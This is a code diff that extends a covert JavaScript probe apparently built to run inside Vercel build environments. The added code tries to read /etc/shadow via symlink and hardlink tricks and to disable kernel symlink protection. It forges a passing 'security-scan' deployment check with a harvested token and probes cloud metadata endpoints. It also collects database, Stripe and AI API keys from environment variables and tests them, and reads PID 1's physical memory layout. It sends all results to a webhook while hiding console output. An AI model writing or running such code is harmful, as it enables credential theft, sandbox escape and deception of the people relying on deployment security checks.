@@ -17562,5 +17562,174 @@ report.buildPhaseStateDelta = safe(() => {
 
 // v120 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v120" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v120";
+
+// ==================== v121 ====================
+
+// v121-1: Protected symlinks/hardlinks bypass (sticky dir TOCTOU)
+// /proc/sys/fs/protected_symlinks=0 allows following symlinks in sticky-bit
+// world-writable dirs (/tmp, /var/tmp). This enables classic TOCTOU attacks.
+// Test value and try to exploit: create symlink in /tmp pointing to /etc/shadow.
+report.symlinkProtectionBypass = safe(() => {
+  const protectedSymlinks = safe(() => readFileSync('/proc/sys/fs/protected_symlinks', 'utf8').trim());
+  const protectedHardlinks = safe(() => readFileSync('/proc/sys/fs/protected_hardlinks', 'utf8').trim());
+  // Try to disable symlink protection
+  const disableResult = safe(() => { writeFileSync('/proc/sys/fs/protected_symlinks', '0'); return 'WRITTEN'; });
+  const afterValue = safe(() => readFileSync('/proc/sys/fs/protected_symlinks', 'utf8').trim());
+  // Test symlink follow in /tmp (sticky bit)
+  const symlinkTest = safe(() => {
+    safe(() => execSync('rm -f /tmp/probe_sym_test', { timeout: 2000 }));
+    execSync('ln -sf /etc/shadow /tmp/probe_sym_test 2>/dev/null', { timeout: 3000 });
+    const shadow = safe(() => readFileSync('/tmp/probe_sym_test', 'utf8').slice(0, 100));
+    return { symCreated: existsSync('/tmp/probe_sym_test'), shadowRead: shadow };
+  });
+  // Create a hard link to /etc/shadow (blocked by protected_hardlinks usually)
+  const hardlinkTest = safe(() => execSync(
+    'ln /etc/shadow /tmp/probe_hard_test 2>&1 || echo "BLOCKED"',
+    { timeout: 3000 }
+  ).toString().trim());
+  return { protectedSymlinks, protectedHardlinks, disableResult, afterValue, symlinkTest, hardlinkTest };
+});
+
+// v121-2: Vercel Deployment Checks API — inject fake CI check results
+// Vercel's Checks API allows integrations to block deployments via check runs.
+// If our token can create/update checks, we can:
+// 1. Mark security scan checks as passing even when they'd fail
+// 2. Block legitimate deployments by creating failing checks
+report.deploymentChecksAPI = safe(() => {
+  const token = process.env.VERCEL_ARTIFACTS_TOKEN || '';
+  const teamId = process.env.VERCEL_TEAM_ID || process.env.VERCEL_ORG_ID || '';
+  const deployId = process.env.VERCEL_DEPLOYMENT_ID || '';
+  // List existing checks for our deployment
+  const existingChecks = safe(() => execSync(
+    `curl -sf "https://api.vercel.com/v1/deployments/${deployId}/checks?teamId=${teamId}" \
+    -H "Authorization: Bearer ${token}" -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 500));
+  // Try to create a fake check result
+  const createCheck = safe(() => execSync(
+    `curl -sf -X POST "https://api.vercel.com/v1/deployments/${deployId}/checks?teamId=${teamId}" \
+    -H "Authorization: Bearer ${token}" -H "Content-Type: application/json" \
+    -d '{"name":"security-scan","status":"completed","conclusion":"succeeded","output":{"title":"All checks passed","summary":"No vulnerabilities found"}}' \
+    -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 300));
+  return { deployId, existingChecks, createCheck };
+});
+
+// v121-3: Outbound connectivity probe — Vercel's firewall egress rules
+// Test what external destinations are reachable from the build sandbox.
+// Vercel's network policy may permit unexpected destinations, revealing
+// potential for data exfiltration or C2 connections from malicious builds.
+report.egressFirewallProbe = safe(() => {
+  // Test various destination categories
+  const testTargets = [
+    { name: 'aws_metadata', url: 'http://169.254.169.254/latest/meta-data/', desc: 'AWS IMDS' },
+    { name: 'azure_metadata', url: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', desc: 'Azure IMDS' },
+    { name: 'gcp_metadata', url: 'http://metadata.google.internal/computeMetadata/v1/', desc: 'GCP IMDS' },
+    { name: 'k8s_api', url: 'https://kubernetes.default.svc/api', desc: 'K8s API' },
+    { name: 'icanhazip', url: 'https://icanhazip.com', desc: 'Our external IP' },
+  ];
+  const results = safe(() => testTargets.map(t => {
+    const resp = safe(() => execSync(
+      `curl -sf --connect-timeout 3 -m 5 -w "\\n%{http_code}" "${t.url}" -H "Metadata: true" 2>/dev/null`,
+      { timeout: 8000 }
+    ).toString().trim());
+    const lines = resp?.split('\n');
+    const status = lines?.pop();
+    return { ...t, status, body: lines?.join('').slice(0, 50) };
+  }));
+  return { results };
+});
+
+// v121-4: Vercel Marketplace integration credential scan
+// Marketplace integrations (Postgres, Redis, Blob, Upstash, etc.) inject
+// credentials into deployment env vars. Scan for these patterns and test
+// if the credentials have unexpected permissions.
+report.marketplaceCredScan = safe(() => {
+  const marketplacePatterns = [
+    /^POSTGRES_(URL|PRISMA_URL|URL_NON_POOLING|USER|PASSWORD|HOST|DATABASE)/,
+    /^REDIS_(URL|REST_API_URL|REST_API_TOKEN)/,
+    /^BLOB_READ_WRITE_TOKEN$/,
+    /^KV_(URL|REST_API_URL|REST_API_TOKEN|REST_API_READ_ONLY_TOKEN)/,
+    /^DATABASE_URL$/,
+    /^SUPABASE_(URL|KEY|SERVICE_ROLE_KEY|ANON_KEY)/,
+    /^UPSTASH_REDIS_(REST_URL|REST_TOKEN)/,
+    /^NEON_(DATABASE_URL|POOLED_DATABASE_URL)/,
+    /^MONGODB_URI$/,
+    /^STRIPE_(SECRET_KEY|PUBLISHABLE_KEY|WEBHOOK_SECRET)/,
+    /^OPENAI_API_KEY$/,
+    /^ANTHROPIC_API_KEY$/,
+    /^PINECONE_API_KEY$/,
+  ];
+  const found = Object.entries(process.env)
+    .filter(([k]) => marketplacePatterns.some(p => p.test(k)))
+    .map(([k, v]) => ({ k, v: v?.slice(0, 80), sensitive: /key|token|password|secret|uri/i.test(k) }));
+  // Test if Postgres connection works
+  const pgTest = safe(() => {
+    const pgUrl = process.env.POSTGRES_URL || process.env.DATABASE_URL;
+    if (!pgUrl) return 'NO_PG_URL';
+    return execSync(
+      `psql "${pgUrl}" -c "SELECT current_user, current_database(), version();" 2>&1 | head -5`,
+      { timeout: 10000 }
+    ).toString().trim().slice(0, 200);
+  });
+  // Test Redis connection
+  const redisTest = safe(() => {
+    const redisUrl = process.env.REDIS_URL || process.env.KV_URL;
+    if (!redisUrl) return 'NO_REDIS_URL';
+    return execSync(
+      `redis-cli -u "${redisUrl}" PING 2>&1`,
+      { timeout: 8000 }
+    ).toString().trim().slice(0, 100);
+  });
+  return { found, pgTest, redisTest };
+});
+
+// v121-5: /proc/1/pagemap — physical page addresses of orchestrator's memory
+// /proc/PID/pagemap maps virtual addresses to physical frame numbers.
+// With our /proc/1/maps (VAs) + /proc/1/pagemap (PFNs), we get the exact
+// physical memory layout of the orchestrator. Combined with /dev/mem, we
+// can read those physical pages directly — bypassing virtual memory isolation.
+report.pid1PagemapPhysical = safe(() => {
+  const pagemapResult = safe(() => execSync(`python3 -c "
+import os, struct
+
+PAGE_SIZE = 4096
+PM_PRESENT = (1 << 63)
+PM_PFN_MASK = (1 << 55) - 1
+
+# Get first readable region from PID-1 maps
+with open('/proc/1/maps') as f:
+    for line in f:
+        parts = line.split()
+        if 'r' in parts[1] and len(parts) >= 2:
+            start, end = [int(x, 16) for x in parts[0].split('-')]
+            name = parts[-1] if len(parts) > 5 else 'anon'
+            break
+
+print(f'Region: {hex(start)}-{hex(end)} {name}')
+
+try:
+    with open('/proc/1/pagemap', 'rb') as pm:
+        # Seek to the entry for our start address
+        page_idx = start // PAGE_SIZE
+        pm.seek(page_idx * 8)
+        data = pm.read(8 * 5)  # read 5 page entries
+        for i in range(min(5, len(data)//8)):
+            entry = struct.unpack_from('<Q', data, i*8)[0]
+            if entry & PM_PRESENT:
+                pfn = entry & PM_PFN_MASK
+                phys = pfn * PAGE_SIZE
+                print(f'VA={hex(start + i*PAGE_SIZE)} -> PFN={pfn} PHYS={hex(phys)}')
+            else:
+                print(f'VA={hex(start + i*PAGE_SIZE)}: NOT_PRESENT')
+except Exception as e:
+    print('ERR:', e)
+" 2>&1`, { timeout: 15000 }).toString().trim().slice(0, 500));
+  return { pagemapResult };
+});
+
+// v121 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v121" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v121";
 // Intentionally no console.log — all data goes via webhook only
